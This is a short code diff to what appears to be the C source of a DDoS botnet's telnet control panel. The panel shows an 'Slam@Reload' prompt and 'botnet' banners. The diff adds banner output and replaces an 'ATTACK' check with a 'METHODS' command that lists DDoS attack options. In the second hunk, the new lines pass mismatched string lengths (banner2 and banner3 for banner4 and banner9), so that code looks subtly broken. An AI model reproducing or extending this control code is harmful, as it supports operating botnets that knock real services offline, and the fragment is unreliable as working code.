@@ -423,6 +423,8 @@ void *telnetWorker(void *sock) {
 		if(send(thefd, banner1, strlen(banner1), MSG_NOSIGNAL) == -1) goto end;
         	if(send(thefd, banner2, strlen(banner2), MSG_NOSIGNAL) == -1) goto end;
 		if(send(thefd, banner3, strlen(banner3), MSG_NOSIGNAL) == -1) goto end;
+        	if(send(thefd, banner4, strlen(banner4), MSG_NOSIGNAL) == -1) goto end;
+		if(send(thefd, banner9, strlen(banner9), MSG_NOSIGNAL) == -1) goto end;
 		while(1) {
 		if(send(thefd, "\r\e[38;2;89;255;0m[\e[38;2;0;229;255mSlam\e[38;2;89;255;0m@\e[38;2;0;229;255mReload\e[38;2;89;255;0m]\e[38;2;0;229;255m#\e[38;2;89;255;0m", 45, MSG_NOSIGNAL) == -1) goto end;
 		break;
@@ -437,7 +439,7 @@ void *telnetWorker(void *sock) {
           if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
         }
           
-if(strstr(buf, "ATTACK")) {
+if (strncmp(buf, "METHODS", 7) == 0 || strncmp(buf, "methods", 7) == 0 || strncmp(buf, "mETHODS", 7) == 0 || strncmp(buf, "Methods", 7) == 0) {
 				pthread_create(&title, NULL, &titleWriter, sock);
 				char ddosline1  [80];
 				char ddosline2  [80];
@@ -543,6 +545,8 @@ if(strstr(buf, "ATTACK")) {
 		if(send(thefd, banner1, strlen(banner1), MSG_NOSIGNAL) == -1) goto end;
         	if(send(thefd, banner2, strlen(banner2), MSG_NOSIGNAL) == -1) goto end;
 		if(send(thefd, banner3, strlen(banner3), MSG_NOSIGNAL) == -1) goto end;
+        	if(send(thefd, banner4, strlen(banner2), MSG_NOSIGNAL) == -1) goto end;
+		if(send(thefd, banner9, strlen(banner3), MSG_NOSIGNAL) == -1) goto end;
          }
          if (strstr(buf, "EXIT")) 
          {
